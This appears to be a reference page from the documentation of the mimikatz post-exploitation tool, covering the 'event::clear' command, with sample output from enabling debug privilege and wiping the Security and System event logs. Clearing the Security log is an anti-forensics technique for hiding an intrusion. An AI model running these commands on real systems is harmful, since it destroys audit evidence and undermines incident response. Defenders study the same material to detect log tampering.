# clear

It clears a specified event log. It has the following command line argument:

* `/log`: The event log to clear. The default one is **Security**

```text
mimikatz # privilege::debug
Privilege '20' OK
```

```text
mimikatz # event::clear
Using "Security" event log :
- 3996 event(s)
- Cleared !
- 0 event(s)
```

```text
mimikatz # event::clear /log:System
Using "System" event log :
- 818 event(s)
- Cleared !
- 0 event(s)
```

